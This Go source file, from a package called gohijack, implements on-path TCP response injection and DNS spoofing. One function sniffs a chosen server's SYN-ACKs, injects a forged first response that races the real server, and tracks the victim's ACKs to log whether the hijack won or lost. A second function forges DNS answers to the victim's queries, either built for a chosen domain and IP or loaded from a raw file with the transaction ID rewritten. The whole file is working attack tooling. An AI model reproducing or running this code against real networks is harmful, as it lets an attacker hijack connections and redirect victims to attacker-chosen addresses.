package gohijack

import (
	"context"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/ssst0n3/awesome_libs/log"
	"github.com/ssst0n3/go-shijack/sniff"
	"golang.org/x/net/ipv4"
	"net"
	"os"
	"time"
)

// confirmTimeout is how long the TCP loop waits for a victim ACK before
// declaring a race result INCONCLUSIVE. 2s is generous for a single on-path
// hop; if no ACK arrives the victim likely never sent one (e.g. RST) or the
// reverse path isn't captured.
const confirmTimeout = 2 * time.Second

// windowPeriod is the interval between periodic window heartbeats in --keep
// mode. Each heartbeat logs counts accumulated since the last one and resets
// them, so an operator watching a long-running hijack sees liveness without
// per-packet spam.
const windowPeriod = 5 * time.Second

// stats tracks pipeline activity for logging. TCP uses all six fields; DNS
// uses only sniffed/injected/skipped (UDP has no ACK, so win/loss/inconclusive
// stay zero). window* are reset every windowPeriod; total* accumulate for the
// shutdown summary.
type stats struct {
	windowSniffed, windowInjected, windowSkipped int
	windowWin, windowLoss, windowInconclusive    int
	totalSniffed, totalInjected, totalSkipped    int
	totalWin, totalLoss, totalInconclusive       int
}

func (s *stats) logWindow() {
	if s.windowSniffed == 0 && s.windowInjected == 0 && s.windowSkipped == 0 {
		return
	}
	log.Logger.Infof("last 5s: %d connection(s) seen, %d injected, %d won, %d lost, %d inconclusive, %d skipped",
		s.windowSniffed, s.windowInjected, s.windowWin, s.windowLoss, s.windowInconclusive, s.windowSkipped)
	s.windowSniffed, s.windowInjected, s.windowSkipped = 0, 0, 0
	s.windowWin, s.windowLoss, s.windowInconclusive = 0, 0, 0
}

func (s *stats) logShutdown() {
	log.Logger.Infof("shutdown summary: %d connection(s) seen, %d injected, %d won, %d lost, %d inconclusive, %d skipped",
		s.totalSniffed, s.totalInjected, s.totalWin, s.totalLoss, s.totalInconclusive, s.totalSkipped)
}

// flowKey identifies a single TCP flow for pending-ack tracking. client and
// server are stored as 4-byte IPv4 to keep the key comparable without net.IP
// allocations (net.IP is a slice and compares by content, not identity).
type flowKey struct {
	clientIP   [4]byte
	clientPort uint16
	serverIP   [4]byte
	serverPort uint16
}

func makeFlowKey(clientIP net.IP, clientPort uint16, serverIP net.IP, serverPort uint16) flowKey {
	k := flowKey{clientPort: clientPort, serverPort: serverPort}
	copy(k.clientIP[:], clientIP.To4())
	copy(k.serverIP[:], serverIP.To4())
	return k
}

// pendingConfirm tracks an injected segment awaiting a victim ACK to classify
// the race result. expectedAck is injectedSeq+len(payload); deadline is when
// we give up and report INCONCLUSIVE.
type pendingConfirm struct {
	expectedAck uint32
	injectedSeq uint32
	deadline    time.Time
}

func doHijack(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (injectedSeq uint32, err error) {
	connection, err := NewConnectionFromPacket(packet, rawConn)
	if err != nil {
		return
	}
	tcpLayer, ipv4Layer, err := connection.GenerateLayers(payload)
	if err != nil {
		return
	}
	buf, err := connection.Serialize(tcpLayer, ipv4Layer, payload)
	if err != nil {
		return
	}
	err = connection.SendIP(buf)
	if err != nil {
		return
	}
	injectedSeq = connection.Seq
	return
}

// Hijack sniffs the impersonated server's SYN-ACKs and injects a forged first
// response that races the real server's. With the bidirectional BPF filter it
// also sees the victim's ACKs and reports, per injection, whether the race was
// won (WIN), lost to the real server (LOSS), or undecided within confirmTimeout
// (INCONCLUSIVE). In once mode it waits for confirmation before returning.
func Hijack(ctx context.Context, interfaceName string, srcIp string, srcPort uint32, payloadFile string, once bool) (err error) {
	payload, err := os.ReadFile(payloadFile)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if len(payload) == 0 {
		err = fmt.Errorf("payload file %q is empty; nothing to inject", payloadFile)
		awesome_error.CheckErr(err)
		return
	}
	rawConn, err := CreateSocket()
	if err != nil {
		return
	}
	defer rawConn.Close()
	sniffer := sniff.PureGo{}
	// Bidirectional: forward arm feeds SYN-ACK sniffing + injection, reverse
	// arm feeds victim ACKs for race confirmation.
	filter, err := GenerateFilterBidirectionalTCP(srcIp, srcPort)
	if err != nil {
		return
	}
	packets, err := sniffer.Sniff(interfaceName, filter)
	if err != nil {
		return
	}

	serverIP := net.ParseIP(srcIp)
	serverPort := layers.TCPPort(srcPort)

	var st stats
	pendingAcks := make(map[flowKey]*pendingConfirm)
	injectedOnce := false

	tickerSweep := time.NewTicker(200 * time.Millisecond)
	defer tickerSweep.Stop()
	tickerWindow := time.NewTicker(windowPeriod)
	defer tickerWindow.Stop()

	logWindow := func() { st.logWindow() }
	logShutdown := func() { st.logShutdown() }

	for {
		// once mode returns once every injection has been confirmed (or
		// timed out) and no pending ACKs remain.
		if once && injectedOnce && len(pendingAcks) == 0 {
			logShutdown()
			return
		}

		select {
		case <-ctx.Done():
			logShutdown()
			return ctx.Err()
		case <-tickerWindow.C:
			logWindow()
		case <-tickerSweep.C:
			// Expire pending confirms that have outlived their deadline.
			now := time.Now()
			for key, p := range pendingAcks {
				if now.After(p.deadline) {
					st.totalInconclusive++
					st.windowInconclusive++
					log.Logger.Infof("hijack inconclusive: %d.%d.%d.%d:%d no ACK within %s",
						key.clientIP[0], key.clientIP[1], key.clientIP[2], key.clientIP[3], key.clientPort, confirmTimeout)
					delete(pendingAcks, key)
				}
			}
		case packet, ok := <-packets:
			if !ok {
				logShutdown()
				return
			}
			tcpLayer := packet.Layer(layers.LayerTypeTCP)
			if tcpLayer == nil {
				continue
			}
			tcp, _ := tcpLayer.(*layers.TCP)
			if tcp == nil {
				continue
			}
			ip4L := packet.Layer(layers.LayerTypeIPv4)
			if ip4L == nil {
				continue
			}
			ip4, _ := ip4L.(*layers.IPv4)
			if ip4 == nil {
				continue
			}

			// Forward direction: server -> client (SYN-ACK to hijack).
			if ip4.SrcIP.Equal(serverIP) && tcp.SrcPort == serverPort {
				if !tcp.SYN || !tcp.ACK {
					st.totalSkipped++
					st.windowSkipped++
					log.Logger.Debugf("skipped non-SYN-ACK from %s:%d", ip4.SrcIP, tcp.SrcPort)
					continue
				}
				st.totalSniffed++
				st.windowSniffed++
				log.Logger.Infof("new connection %s:%d -> %s:%d",
					ip4.DstIP, tcp.DstPort, ip4.SrcIP, tcp.SrcPort)
				injectedSeq, hijackErr := doHijack(packet, payload, rawConn)
				if hijackErr != nil {
					continue
				}
				st.totalInjected++
				st.windowInjected++
				log.Logger.Infof("injected %d bytes -> %s:%d",
					len(payload), ip4.DstIP, tcp.DstPort)
				key := makeFlowKey(ip4.DstIP, uint16(tcp.DstPort), ip4.SrcIP, uint16(tcp.SrcPort))
				pendingAcks[key] = &pendingConfirm{
					expectedAck: injectedSeq + uint32(len(payload)),
					injectedSeq: injectedSeq,
					deadline:    time.Now().Add(confirmTimeout),
				}
				injectedOnce = true
				continue
			}

			// Reverse direction: client -> server (ACK confirming injection).
			if ip4.DstIP.Equal(serverIP) && tcp.DstPort == serverPort {
				if !tcp.ACK {
					continue
				}
				key := makeFlowKey(ip4.SrcIP, uint16(tcp.SrcPort), ip4.DstIP, uint16(tcp.DstPort))
				p, ok := pendingAcks[key]
				if !ok {
					continue
				}
				switch classifyAck(tcp.Ack, p.expectedAck, p.injectedSeq) {
				case ackWin:
					st.totalWin++
					st.windowWin++
					log.Logger.Infof("hijack succeeded: %s:%d accepted our forged response", ip4.SrcIP, tcp.SrcPort)
					delete(pendingAcks, key)
				case ackLoss:
					st.totalLoss++
					st.windowLoss++
					log.Logger.Infof("hijack failed: %s:%d accepted the real server's response", ip4.SrcIP, tcp.SrcPort)
					delete(pendingAcks, key)
				case ackPending:
					// Not decisive yet; keep waiting for a later ACK.
				}
				continue
			}
		}
	}
}

// HijackDNS sniffs DNS queries addressed to (resolverIp:resolverPort) and
// races the real resolver with a forged UDP response. When domain and answerIp
// are both non-empty the response is built on the fly; otherwise rawResponseFile
// is loaded once and its transaction ID is rewritten per query. At least one of
// the two modes must be supplied.
//
// UDP has no ACK, so there is no per-injection race confirmation — the operator
// infers success from the victim subsequently connecting to the poisoned IP.
// Activity logging + window heartbeat + shutdown summary still apply.
func HijackDNS(ctx context.Context, interfaceName string, resolverIp string, resolverPort uint32, domain string, answerIp net.IP, rawResponseFile string, once bool) (err error) {
	var rawResponse []byte
	if rawResponseFile != "" {
		rawResponse, err = os.ReadFile(rawResponseFile)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
		if len(rawResponse) == 0 {
			err = fmt.Errorf("payload file %q is empty; nothing to inject", rawResponseFile)
			awesome_error.CheckErr(err)
			return
		}
	}
	autoMode := domain != "" && answerIp != nil
	if !autoMode && rawResponse == nil {
		err = fmt.Errorf("dns hijack needs either --dns-domain/--dns-ip or a payload file")
		awesome_error.CheckErr(err)
		return
	}
	rawConn, err := CreateSocketUDP()
	if err != nil {
		return
	}
	defer rawConn.Close()
	sniffer := sniff.PureGo{}
	filter, err := GenerateFilterUDP(resolverIp, resolverPort)
	if err != nil {
		return
	}
	packets, err := sniffer.Sniff(interfaceName, filter)
	if err != nil {
		return
	}

	var st stats

	tickerWindow := time.NewTicker(windowPeriod)
	defer tickerWindow.Stop()

	logShutdown := func() { st.logShutdown() }

	for {
		select {
		case <-ctx.Done():
			logShutdown()
			return ctx.Err()
		case <-tickerWindow.C:
			st.logWindow()
		case packet, ok := <-packets:
			if !ok {
				logShutdown()
				return
			}
			udpLayer := packet.Layer(layers.LayerTypeUDP)
			if udpLayer == nil {
				continue
			}
			dnsLayer := packet.Layer(layers.LayerTypeDNS)
			if dnsLayer == nil {
				continue
			}
			queryDNS, _ := dnsLayer.(*layers.DNS)
			if queryDNS == nil {
				continue
			}
			if queryDNS.QR {
				continue
			}
			ip4L := packet.Layer(layers.LayerTypeIPv4)
			if ip4L == nil {
				continue
			}
			ip4, _ := ip4L.(*layers.IPv4)
			if ip4 == nil {
				continue
			}
			udp, _ := udpLayer.(*layers.UDP)
			if udp == nil {
				continue
			}

			st.totalSniffed++
			st.windowSniffed++
			qname := "<none>"
			if len(queryDNS.Questions) > 0 {
				qname = string(queryDNS.Questions[0].Name)
			}
			log.Logger.Infof("DNS query %q from %s:%d", qname, ip4.SrcIP, udp.SrcPort)

			var payload []byte
			if autoMode {
				if len(queryDNS.Questions) == 0 || !dnsNameEqual(queryDNS.Questions[0].Name, domain) {
					st.totalSkipped++
					st.windowSkipped++
					log.Logger.Infof("skipped %q — domain mismatch (want %q)", qname, domain)
					continue
				}
				payload, err = BuildDNSResponse(queryDNS, domain, answerIp)
				if err != nil {
					continue
				}
			} else {
				payload = RewriteTXID(rawResponse, queryDNS.ID)
			}
			if hijackErr := doHijackUDP(packet, payload, rawConn); hijackErr != nil {
				continue
			}
			st.totalInjected++
			st.windowInjected++
			if autoMode {
				log.Logger.Infof("injected forged A %q -> %s (%d bytes) -> %s:%d",
					domain, answerIp, len(payload), ip4.SrcIP, udp.SrcPort)
			} else {
				log.Logger.Infof("injected forged DNS response (%d bytes) -> %s:%d",
					len(payload), ip4.SrcIP, udp.SrcPort)
			}
			if once {
				logShutdown()
				return
			}
		}
	}
}

func doHijackUDP(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (err error) {
	connection, err := NewUDPConnectionFromPacket(packet, rawConn)
	if err != nil {
		return
	}
	udpLayer, ipv4Layer, err := connection.GenerateLayersUDP(payload)
	if err != nil {
		return
	}
	buf, err := connection.SerializeUDP(udpLayer, ipv4Layer, payload)
	if err != nil {
		return
	}
	err = connection.SendIP(buf)
	if err != nil {
		return
	}
	return
}
